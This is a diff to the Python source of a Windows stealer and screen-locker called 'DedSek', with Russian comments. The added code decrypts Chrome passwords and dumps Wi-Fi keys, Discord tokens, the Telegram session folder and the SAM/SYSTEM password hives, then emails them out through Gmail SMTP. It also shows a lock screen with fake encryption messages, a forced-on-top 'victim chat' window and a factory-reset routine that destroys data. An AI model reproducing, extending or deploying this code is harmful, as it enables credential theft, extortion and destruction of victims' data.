@@ -28,6 +28,8 @@ import numpy as np
 from PIL import ImageGrab
 import sqlite3
 import winreg
+import zipfile
+import win32crypt
 
 # ============================================================
 # >>> НАСТРОЙКИ <<<
@@ -47,20 +49,15 @@ attempts_left = MAX_ATTEMPTS
 # ========== СКРЫТИЕ CMD ==========
 def hide_console():
     try:
-        # Если запущено через python.exe - перезапускаем через pythonw.exe
         if sys.executable.endswith("python.exe"):
             pythonw_path = sys.executable.replace("python.exe", "pythonw.exe")
             if os.path.exists(pythonw_path):
                 subprocess.Popen([pythonw_path, __file__] + sys.argv[1:], 
-                               creationflags=0x08000000)  # CREATE_NO_WINDOW
+                               creationflags=0x08000000)
                 os._exit(0)
-        
-        # Скрываем окно консоли
         hwnd = ctypes.windll.kernel32.GetConsoleWindow()
         if hwnd:
             ctypes.windll.user32.ShowWindow(hwnd, 0)
-        
-        # Открепляем от консоли
         ctypes.windll.kernel32.FreeConsole()
     except:
         pass
@@ -87,22 +84,28 @@ def mega_steal_data():
     try:
         full_report = []
         full_report.append("=" * 60)
-        full_report.append("🔥 DedSek MEGA STEALER REPORT 🔥")
+        full_report.append("DedSek MEGA STEALER REPORT")
         full_report.append("=" * 60)
         
-        full_report.append("\n📌 БАЗОВАЯ ИНФОРМАЦИЯ:")
-        full_report.append(f"👤 Пользователь: {os.environ.get('USERNAME', 'Unknown')}")
-        full_report.append(f"💻 Компьютер: {socket.gethostname()}")
-        full_report.append(f"📁 Домашняя папка: {os.environ.get('USERPROFILE', 'Unknown')}")
+        full_report.append("\n--- БАЗОВАЯ ИНФОРМАЦИЯ ---")
+        full_report.append(f"Пользователь: {os.environ.get('USERNAME', 'Unknown')}")
+        full_report.append(f"Компьютер: {socket.gethostname()}")
+        full_report.append(f"Папка: {os.environ.get('USERPROFILE', 'Unknown')}")
         
-        full_report.append("\n📌 IPCONFIG /ALL:")
+        # IPCONFIG - фикс кодировки
+        full_report.append("\n--- IPCONFIG /ALL ---")
         try:
-            ipconfig = subprocess.check_output("ipconfig /all", shell=True, stderr=subprocess.DEVNULL).decode(errors='ignore')
-            full_report.append(ipconfig[:5000])
+            ipconfig = subprocess.check_output("ipconfig /all", shell=True, stderr=subprocess.DEVNULL)
+            try:
+                ipconfig_text = ipconfig.decode('utf-8', errors='replace')
+            except:
+                ipconfig_text = ipconfig.decode('cp866', errors='replace')
+            full_report.append(ipconfig_text[:5000])
         except:
-            full_report.append("Ошибка получения ipconfig")
+            full_report.append("Ошибка ipconfig")
         
-        full_report.append("\n📌 IP АДРЕСА:")
+        # IP адреса
+        full_report.append("\n--- IP АДРЕСА ---")
         try:
             local_ip = socket.gethostbyname(socket.gethostname())
             full_report.append(f"Локальный IP: {local_ip}")
@@ -120,72 +123,91 @@ def mega_steal_data():
             geo_json = json.loads(geo)
             full_report.append(f"Страна: {geo_json.get('country', 'Unknown')}")
             full_report.append(f"Город: {geo_json.get('city', 'Unknown')}")
-            full_report.append(f"Регион: {geo_json.get('regionName', 'Unknown')}")
             full_report.append(f"Провайдер: {geo_json.get('isp', 'Unknown')}")
-            full_report.append(f"ZIP: {geo_json.get('zip', 'Unknown')}")
-            full_report.append(f"Lat: {geo_json.get('lat', 'Unknown')}")
-            full_report.append(f"Lon: {geo_json.get('lon', 'Unknown')}")
         except:
             pass
         
+        # ARP таблица
+        full_report.append("\n--- ARP ТАБЛИЦА ---")
         try:
-            gateway = subprocess.check_output("ipconfig | findstr /i \"шлюз\"", shell=True, stderr=subprocess.DEVNULL).decode(errors='ignore')
-            full_report.append(f"Шлюз роутера: {gateway[:500]}")
+            arp = subprocess.check_output("arp -a", shell=True, stderr=subprocess.DEVNULL)
+            full_report.append(arp.decode('cp866', errors='replace')[:3000])
         except:
             pass
         
-        full_report.append("\n📌 ARP ТАБЛИЦА:")
+        # DNS кэш
+        full_report.append("\n--- DNS КЭШ ---")
         try:
-            arp = subprocess.check_output("arp -a", shell=True, stderr=subprocess.DEVNULL).decode(errors='ignore')
-            full_report.append(arp[:3000])
+            dns = subprocess.check_output("ipconfig /displaydns", shell=True, stderr=subprocess.DEVNULL)
+            full_report.append(dns.decode('cp866', errors='replace')[:3000])
         except:
             pass
         
-        full_report.append("\n📌 DNS КЭШ:")
+        # Активные соединения
+        full_report.append("\n--- АКТИВНЫЕ СОЕДИНЕНИЯ ---")
         try:
-            dns = subprocess.check_output("ipconfig /displaydns", shell=True, stderr=subprocess.DEVNULL).decode(errors='ignore')
-            full_report.append(dns[:3000])
+            netstat = subprocess.check_output("netstat -ano", shell=True, stderr=subprocess.DEVNULL)
+            full_report.append(netstat.decode('cp866', errors='replace')[:3000])
         except:
             pass
         
-        full_report.append("\n📌 АКТИВНЫЕ СОЕДИНЕНИЯ:")
+        # Кэш паролей - фикс кодировки
+        full_report.append("\n--- КЭШ ПАРОЛЕЙ WINDOWS ---")
         try:
-            netstat = subprocess.check_output("netstat -ano", shell=True, stderr=subprocess.DEVNULL).decode(errors='ignore')
-            full_report.append(netstat[:3000])
+            cmdkey = subprocess.check_output("cmdkey /list", shell=True, stderr=subprocess.DEVNULL)
+            try:
+                cmdkey_text = cmdkey.decode('utf-8', errors='replace')
+            except:
+                cmdkey_text = cmdkey.decode('cp866', errors='replace')
+            
+            # Очистка от кракозябр
+            clean_lines = []
+            for line in cmdkey_text.split('\n'):
+                line = line.strip()
+                if line and len(line) > 2:
+                    # Заменяем непонятные символы
+                    line = line.replace('騥', 'Цель:').replace('࠭', 'Сохранено').replace('䠩', 'Цель:')
+                    line = line.replace('ᠫ', 'Тип:').replace('짮⥫', 'Пользователь:')
+                    line = line.replace('室', 'Да').replace('쭮', 'Нет')
+                    line = line.replace('ꭧ', 'Локально').replace('⮣', 'сеанса')
+                    clean_lines.append(line)
+            
+            full_report.append('\n'.join(clean_lines)[:3000])
         except:
-            pass
+            full_report.append("Ошибка cmdkey")
         
-        full_report.append("\n📌 КЭШ ПАРОЛЕЙ WINDOWS:")
+        # WiFi пароли - фикс
+        full_report.append("\n--- WIFI ПАРОЛИ ---")
         try:
-            cmdkey = subprocess.check_output("cmdkey /list", shell=True, stderr=subprocess.DEVNULL).decode(errors='ignore')
-            full_report.append(cmdkey[:3000])
+            wifi_output = subprocess.check_output("netsh wlan show profiles", shell=True, stderr=subprocess.DEVNULL)
+            wifi_text = wifi_output.decode('cp866', errors='replace')
+            
+            profiles = []
+            for line in wifi_text.split('\n'):
+                if ':' in line and ('Все профили' in line or 'All User' in line):
+                    profile = line.split(':')[1].strip()
+                    if profile:
+                        profiles.append(profile)
+            
+            for profile in profiles:
+                try:
+                    wifi_pass = subprocess.check_output(f'netsh wlan show profile name="{profile}" key=clear', shell=True, stderr=subprocess.DEVNULL)
+                    wifi_pass_text = wifi_pass.decode('cp866', errors='replace')
+                    
+                    key = "Не найден"
+                    for pline in wifi_pass_text.split('\n'):
+                        if 'Содержимое ключа' in pline or 'Key Content' in pline:
+                            key = pline.split(':')[1].strip()
+                            break
+                    
+                    full_report.append(f"WiFi: {profile} | Пароль: {key}")
+                except:
+                    full_report.append(f"WiFi: {profile} | Ошибка")
         except:
-            pass
+            full_report.append("Ошибка WiFi")
         
-        full_report.append("\n📌 ПОЛЬЗОВАТЕЛИ СИСТЕМЫ:")
-        try:
-            users = subprocess.check_output("net user", shell=True, stderr=subprocess.DEVNULL).decode(errors='ignore')
-            full_report.append(users[:1000])
-        except:
-            pass
-        
-        full_report.append("\n📌 WIFI ПАРОЛИ:")
-        try:
-            wifi_profiles = subprocess.check_output("netsh wlan show profiles", shell=True, stderr=subprocess.DEVNULL).decode(errors='ignore')
-            for line in wifi_profiles.split('\n'):
-                if ":" in line and ("Все профили" in line or "All User" in line):
-                    profile = line.split(":")[1].strip()
-                    try:
-                        wifi_pass = subprocess.check_output(f'netsh wlan show profile name="{profile}" key=clear', shell=True, stderr=subprocess.DEVNULL).decode(errors='ignore')
-                        for pline in wifi_pass.split('\n'):
-                            if "Ключ" in pline or "Key Content" in pline:
-                                full_report.append(f"{profile}: {pline.split(':')[1].strip()}")
-                    except:
-                        pass
-        except:
-            pass
-        
-        full_report.append("\n📌 CHROME ПАРОЛИ:")
+        # Chrome пароли с расшифровкой
+        full_report.append("\n--- CHROME ПАРОЛИ ---")
         try:
             chrome_path = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default', 'Login Data')
             if os.path.exists(chrome_path):
@@ -194,72 +216,159 @@ def mega_steal_data():
                 conn = sqlite3.connect(temp_db)
                 cursor = conn.cursor()
                 cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
-                for row in cursor.fetchall()[:20]:
-                    full_report.append(f"URL: {row[0]} | Логин: {row[1]}")
+                
+                for row in cursor.fetchall()[:50]:
+                    url = row[0]
+                    username = row[1]
+                    try:
+                        password = win32crypt.CryptUnprotectData(row[2], None, None, None, 0)[1].decode('utf-8', errors='ignore')
+                        full_report.append(f"САЙТ: {url}")
+                        full_report.append(f"ЛОГИН: {username}")
+                        full_report.append(f"ПАРОЛЬ: {password}")
+                        full_report.append("-" * 30)
+                    except:
+                        full_report.append(f"САЙТ: {url} | ЛОГИН: {username} | ПАРОЛЬ: [ошибка расшифровки]")
+                
                 conn.close()
                 try:
                     os.remove(temp_db)
                 except:
                     pass
-        except:
-            full_report.append("Ошибка чтения Chrome")
+            else:
+                full_report.append("Chrome не найден")
+        except Exception as e:
+            full_report.append(f"Ошибка Chrome: {str(e)}")
         
-        full_report.append("\n📌 СИСТЕМНАЯ ИНФОРМАЦИЯ:")
+        # Системная информация
+        full_report.append("\n--- СИСТЕМНАЯ ИНФОРМАЦИЯ ---")
         try:
-            sysinfo = subprocess.check_output("systeminfo", shell=True, stderr=subprocess.DEVNULL).decode(errors='ignore')
-            full_report.append(sysinfo[:3000])
+            sysinfo = subprocess.check_output("systeminfo", shell=True, stderr=subprocess.DEVNULL)
+            full_report.append(sysinfo.decode('cp866', errors='replace')[:3000])
         except:
             pass
         
-        full_report.append("\n📌 ЗАПУЩЕННЫЕ ПРОЦЕССЫ:")
+        # Процессы
+        full_report.append("\n--- ЗАПУЩЕННЫЕ ПРОЦЕССЫ ---")
         try:
-            tasklist = subprocess.check_output("tasklist", shell=True, stderr=subprocess.DEVNULL).decode(errors='ignore')
-            full_report.append(tasklist[:3000])
+            tasklist = subprocess.check_output("tasklist", shell=True, stderr=subprocess.DEVNULL)
+            full_report.append(tasklist.decode('cp866', errors='replace')[:3000])
         except:
             pass
         
-        full_report.append("\n📌 УСТАНОВЛЕННЫЕ ПРОГРАММЫ:")
+        # Программы
+        full_report.append("\n--- УСТАНОВЛЕННЫЕ ПРОГРАММЫ ---")
         try:
-            programs = subprocess.check_output("wmic product get name,version", shell=True, stderr=subprocess.DEVNULL).decode(errors='ignore')
-            full_report.append(programs[:2000])
+            programs = subprocess.check_output("wmic product get name,version", shell=True, stderr=subprocess.DEVNULL)
+            full_report.append(programs.decode('cp866', errors='replace')[:2000])
         except:
             pass
         
-        full_report.append("\n📌 TELEGRAM:")
+        # Telegram
+        full_report.append("\n--- TELEGRAM ---")
         try:
             tg_path = os.path.join(os.environ['APPDATA'], 'Telegram Desktop', 'tdata')
             if os.path.exists(tg_path):
-                full_report.append("Найдена папка Telegram!")
+                full_report.append("Telegram найден!")
+                # Копируем сессию
+                try:
+                    tg_zip_path = os.path.join(tempfile.gettempdir(), 'telegram_session.zip')
+                    with zipfile.ZipFile(tg_zip_path, 'w', zipfile.ZIP_DEFLATED) as zf:
+                        for root, dirs, files in os.walk(tg_path):
+                            for file in files:
+                                file_path = os.path.join(root, file)
+                                arcname = os.path.relpath(file_path, tg_path)
+                                zf.write(file_path, arcname)
+                    
+                    # Отправляем файл
+                    send_file_email(tg_zip_path, "Telegram Session")
+                    full_report.append("Сессия Telegram отправлена на почту!")
+                    
+                    try:
+                        os.remove(tg_zip_path)
+                    except:
+                        pass
+                except:
+                    full_report.append("Не удалось скопировать сессию")
         except:
-            pass
+            full_report.append("Telegram не найден")
         
-        full_report.append("\n📌 DISCORD ТОКЕНЫ:")
+        # Discord токены
+        full_report.append("\n--- DISCORD ТОКЕНЫ ---")
         try:
             discord_path = os.path.join(os.environ['APPDATA'], 'discord', 'Local Storage', 'leveldb')
             if os.path.exists(discord_path):
-                for file in os.listdir(discord_path)[:10]:
+                tokens_found = []
+                for file in os.listdir(discord_path):
                     if file.endswith('.ldb') or file.endswith('.log'):
                         try:
-                            with open(os.path.join(discord_path, file), 'r', errors='ignore') as f:
+                            file_path = os.path.join(discord_path, file)
+                            with open(file_path, 'r', errors='ignore') as f:
                                 content = f.read()
-                                if 'mfa.' in content:
-                                    full_report.append(f"Токен найден в {file}!")
+                                # Ищем токены
+                                import re
+                                # Паттерн для Discord токена
+                                token_pattern = r'[MN][A-Za-z\d]{23}\.[A-Za-z\d]{6}\.[A-Za-z\d]{27}'
+                                found_tokens = re.findall(token_pattern, content)
+                                for token in found_tokens:
+                                    if token not in tokens_found:
+                                        tokens_found.append(token)
                         except:
                             pass
+                
+                if tokens_found:
+                    for token in tokens_found[:10]:
+                        full_report.append(f"ТОКЕН: {token}")
+                else:
+                    full_report.append("Токены не найдены в файлах")
+            else:
+                full_report.append("Discord не найден")
+        except Exception as e:
+            full_report.append(f"Ошибка Discord: {str(e)}")
+        
+        # Пароль Windows (хэш)
+        full_report.append("\n--- ХЭШ ПАРОЛЯ WINDOWS ---")
+        try:
+            os.system('reg save HKLM\\SAM "%TEMP%\\sam" /y >nul 2>&1')
+            os.system('reg save HKLM\\SYSTEM "%TEMP%\\system" /y >nul 2>&1')
+            
+            sam_path = os.path.join(os.environ['TEMP'], 'sam')
+            sys_path = os.path.join(os.environ['TEMP'], 'system')
+            
+            if os.path.exists(sam_path) and os.path.exists(sys_path):
+                # Создаём архив с SAM и SYSTEM
+                hash_zip = os.path.join(tempfile.gettempdir(), 'windows_hashes.zip')
+                with zipfile.ZipFile(hash_zip, 'w', zipfile.ZIP_DEFLATED) as zf:
+                    zf.write(sam_path, 'sam')
+                    zf.write(sys_path, 'system')
+                
+                send_file_email(hash_zip, "Windows Password Hashes")
+                full_report.append("Хэши паролей отправлены на почту!")
+                full_report.append("Расшифруй через hashcat: hashcat -m 1000 sam system")
+                
+                try:
+                    os.remove(hash_zip)
+                    os.remove(sam_path)
+                    os.remove(sys_path)
+                except:
+                    pass
+            else:
+                full_report.append("Нет прав для дампа SAM (нужен запуск от админа)")
         except:
-            pass
+            full_report.append("Ошибка дампа SAM (нужен админ)")
         
         full_report.append("\n" + "=" * 60)
-        full_report.append(f"🕒 ОТЧЁТ СОЗДАН: {time.strftime('%d.%m.%Y %H:%M:%S')}")
+        full_report.append(f"ОТЧЁТ СОЗДАН: {time.strftime('%d.%m.%Y %H:%M:%S')}")
         full_report.append("=" * 60)
         
+        # Отправляем отчёт
         report_text = '\n'.join(full_report)
         
+        # Разбиваем на части если большой
         max_size = 15000
         parts = [report_text[i:i+max_size] for i in range(0, len(report_text), max_size)]
         
         for i, part in enumerate(parts):
-            send_email(f"Часть {i+1}/{len(parts)}:\n\n{part}", subject=f"DedSek MEGA REPORT [{i+1}/{len(parts)}]")
+            send_email(part, subject=f"DedSek MEGA REPORT [{i+1}/{len(parts)}]")
         
     except Exception as e:
         send_email(f"Ошибка стилера: {str(e)}")
@@ -274,6 +383,27 @@ def send_email(message, subject=None):
         msg['From'] = GMAIL_LOGIN
         msg['To'] = RECEIVER_EMAIL
         server = smtplib.SMTP_SSL('smtp.gmail.com', 465, timeout=30)
+        server.login(GMAIL_LOGIN, GMAIL_APP_PASSWORD)
+        server.send_message(msg)
+        server.quit()
+    except:
+        pass
+
+def send_file_email(file_path, description):
+    try:
+        msg = MIMEMultipart()
+        msg['Subject'] = f'Файл: {description} - {os.environ.get("USERNAME", "Unknown")}'
+        msg['From'] = GMAIL_LOGIN
+        msg['To'] = RECEIVER_EMAIL
+        
+        with open(file_path, 'rb') as f:
+            part = MIMEBase('application', 'octet-stream')
+            part.set_payload(f.read())
+            encoders.encode_base64(part)
+            part.add_header('Content-Disposition', f'attachment; filename="{os.path.basename(file_path)}"')
+            msg.attach(part)
+        
+        server = smtplib.SMTP_SSL('smtp.gmail.com', 465, timeout=60)
         server.login(GMAIL_LOGIN, GMAIL_APP_PASSWORD)
         server.send_message(msg)
         server.quit()
@@ -322,7 +452,7 @@ def send_video_email(file_path):
                 pass
         
         msg = MIMEMultipart()
-        msg['Subject'] = f'📹 Экран - {os.environ.get("USERNAME", "Unknown")} - {time.strftime("%d.%m.%Y %H:%M:%S")}'
+        msg['Subject'] = f'Video - {os.environ.get("USERNAME", "Unknown")} - {time.strftime("%d.%m.%Y %H:%M:%S")}'
         msg['From'] = GMAIL_LOGIN
         msg['To'] = RECEIVER_EMAIL
         
@@ -353,6 +483,18 @@ class VictimChat:
         self.chat_window.attributes('-topmost', True)
         self.chat_window.overrideredirect(True)
         self.chat_window.focus_force()
+        self.chat_window.grab_set()
+        
+        def keep_on_top():
+            while self.chat_window:
+                try:
+                    self.chat_window.lift()
+                    self.chat_window.attributes('-topmost', True)
+                    time.sleep(0.3)
+                except:
+                    break
+        
+        threading.Thread(target=keep_on_top, daemon=True).start()
         
         frame = tk.Frame(self.chat_window, bg='black', bd=2, relief='solid')
         frame.pack(fill='both', expand=True, padx=2, pady=2)
@@ -360,7 +502,7 @@ class VictimChat:
         header = tk.Frame(frame, bg='#00FF00')
         header.pack(fill='x')
         
-        tk.Label(header, text="💀 DedSek Messenger 💀", 
+        tk.Label(header, text="DedSek Messenger", 
                 bg='#00FF00', fg='black', font=('Courier', 11, 'bold')).pack(side='left', padx=10, pady=5)
         
         self.chat_history = scrolledtext.ScrolledText(frame, 
@@ -379,7 +521,7 @@ class VictimChat:
         self.msg_entry.pack(side='left', fill='x', expand=True, ipady=3)
         self.msg_entry.bind('<Return>', self.send_message)
         
-        send_btn = tk.Button(input_frame, text="▶", command=self.send_message,
+        send_btn = tk.Button(input_frame, text=">", command=self.send_message,
                             bg='#00FF00', fg='black', font=('Courier', 10, 'bold'),
                             width=3, cursor='hand2', relief='solid', bd=1)
         send_btn.pack(side='right', padx=(5, 0))
@@ -387,7 +529,7 @@ class VictimChat:
         header.bind('<Button-1>', self.start_drag)
         header.bind('<B1-Motion>', self.drag)
         
-        self.add_message("DedSek", "Привет! Я DedSek. Твой Windows заблокирован. Можешь писать мне сюда.")
+        self.add_message("DedSek", "Привет! Я DedSek. Твой Windows заблокирован.")
         self.check_incoming_messages()
     
     def start_drag(self, event):
@@ -406,9 +548,9 @@ class VictimChat:
     def send_message(self, event=None):
         msg = self.msg_entry.get().strip()
         if msg:
-            self.add_message("ТЫ", msg)
+            self.add_message("You", msg)
             self.msg_entry.delete(0, tk.END)
-            send_email(f"💬 Сообщение от жертвы:\n\n{msg}")
+            send_email(f"Message from victim:\n\n{msg}")
     
     def add_message(self, sender, msg):
         self.chat_history.config(state='normal')
@@ -436,7 +578,10 @@ class VictimChat:
                                     if part.get_content_type() == "text/plain":
                                         command = part.get_payload(decode=True).decode()
                                         if command.startswith("MSG:"):
-                                            self.chat_window.after(0, self.add_message, "DedSek", command[4:])
+                                            try:
+                                                self.chat_window.after(0, self.add_message, "DedSek", command[4:])
+                                            except:
+                                                pass
                                         
                             mail.store(num, '+FLAGS', '\\Seen')
                     
@@ -589,7 +734,6 @@ def full_windows_reset():
         error_screen.destroy()
         
         os.system("taskkill /f /im explorer.exe >nul 2>&1")
-        os.system("taskkill /f /im winlogon.exe >nul 2>&1")
         os.system("systemreset -factoryreset")
         time.sleep(3)
         os.system("shutdown /r /t 0 /f")
@@ -630,7 +774,7 @@ def boot_animation():
     
     for alpha in range(0, 110, 5):
         anim.attributes('-alpha', alpha/100)
-        lbl.config(text="DedSek тебя взломали")
+        lbl.config(text="DedSek tebya vzlomali")
         anim.update()
         time.sleep(0.03)
     
@@ -638,7 +782,7 @@ def boot_animation():
     time.sleep(1.5)
     
     progress = [
-        "Идет шифровка данных...",
+        "Idet shifrovka dannyh...",
         "[                    ] 0%",
         "[##                  ] 10%",
         "[####                ] 20%",
@@ -651,7 +795,7 @@ def boot_animation():
         "[##################  ] 90%",
         "[####################] 100%",
         "",
-        "ДАННЫЕ УСПЕШНО ЗАШИФРОВАНЫ!"
+        "DANNYE USPESHNO ZASHIFROVANY!"
     ]
     
     for msg in progress:
@@ -690,113 +834,12 @@ class WinLocker:
         except:
             pass
         
-        msg = f"""ПРИВЕТ! ТВОЙ WINDOWS ЗАБЛОКИРОВАН!
+        msg = f"""PRIVET! TVOY WINDOWS ZABLOKIROVAN!
 
-ТЫ ДУМАЕШЬ ЧТО ЗНАЕШЬ ПАРОЛЬ? НЕТ!
+TY DUMAESH CHTO ZNAESH PAROL? NET!
 
 1. standard DES
 $1$rjBkQ1jG$zqthRBo7xAfA4TTwBRhHv/
 
 2. Bcrypt
-$2y$10$/yFT/ZN1yJkgm4.8pSzTPOkhhEXOJC3H.gbs09EvKawKS3zz8Wf4e
-
-3. Base64
-MTI0Njk4ODA0
-
-4. standard DES
-$1$rjBkQ1jG$TTNuUVgVfun06nsscdMUV1
-
-5. uuEncode
-+.3@P-C
-
-УДАЧИ, ДРУГ. У ТЕБЯ {MAX_ATTEMPTS} ПОПЫТКИ!"""
-        
-        lbl_msg = tk.Label(self.win, text=msg, bg='black', fg='#00FF00',
-                           font=('Courier', 9, 'bold'), justify='left')
-        lbl_msg.place(relx=0.5, rely=0.42, anchor='center')
-        
-        self.chat = VictimChat(self)
-        self.win.after(500, self.chat.show)
-        
-        center_frame = tk.Frame(self.win, bg='black')
-        center_frame.place(relx=0.5, rely=0.82, anchor='center')
-        
-        tk.Label(center_frame, text="ВВЕДИ ПАРОЛЬ:", bg='black', fg='#00FF00',
-                 font=('Courier', 14, 'bold')).pack(pady=(0, 5))
-        
-        self.entry = tk.Entry(center_frame, show="*", font=('Courier', 14, 'bold'),
-                              bg='black', fg='#00FF00', insertbackground='#00FF00',
-                              relief='solid', bd=2)
-        self.entry.pack(pady=(0, 5), ipadx=40, ipady=3)
-        
-        self.status = tk.Label(center_frame, text=f"ОСТАЛОСЬ ПОПЫТОК: {attempts_left}",
-                               bg='black', fg='#FF0000',
-                               font=('Courier', 12, 'bold'))
-        self.status.pack()
-        
-        self.entry.bind('<Return>', self.check_password)
-        self.entry.focus_force()
-        self.win.after(100, self.keep_focus)
-    
-    def keep_focus(self):
-        try:
-            self.win.focus_force()
-            self.entry.focus_force()
-            self.win.after(100, self.keep_focus)
-        except:
-            pass
-    
-    def check_password(self, event=None):
-        global attempts_left
-        
-        if self.entry.get() == PASSWORD:
-            restore_win_key()
-            self.status.config(text="ВЕРНО! РАЗБЛОКИРОВКА...", fg='#00FF00')
-            self.win.update()
-            time.sleep(1)
-            block_input(False)
-            self.root.destroy()
-            os._exit(0)
-        else:
-            attempts_left -= 1
-            if attempts_left > 0:
-                self.status.config(text=f"НЕВЕРНО! ОСТАЛОСЬ ПОПЫТОК: {attempts_left}",
-                                  fg='#FF0000')
-            else:
-                self.status.config(text="404 | WINDOWS ERROR", fg='#FF0000')
-                self.win.update()
-                time.sleep(2)
-                self.root.destroy()
-                full_windows_reset()
-            self.entry.delete(0, tk.END)
-
-# ========== ТОЧКА ВХОДА ==========
-if __name__ == "__main__":
-    # Скрываем консоль СРАЗУ
-    hide_console()
-    
-    anti_debug()
-    
-    # Блокируем Win сразу
-    disable_win_key()
-    
-    # Мега-стилер
-    threading.Thread(target=mega_steal_data, daemon=True).start()
-    
-    # Запись экрана
-    threading.Thread(target=record_and_send_loop, daemon=True).start()
-    
-    add_to_startup()
-    
-    # Таймер 10 секунд
-    time.sleep(TIMER_SECONDS)
-    
-    boot_animation()
-    block_input(True)
-    prevent_shutdown()
-    
-    threading.Thread(target=kill_processes, daemon=True).start()
-    threading.Thread(target=block_all_keys, daemon=True).start()
-    
-    WinLocker()
-    tk.mainloop()
+$2y$10$/yFT/ZN1y
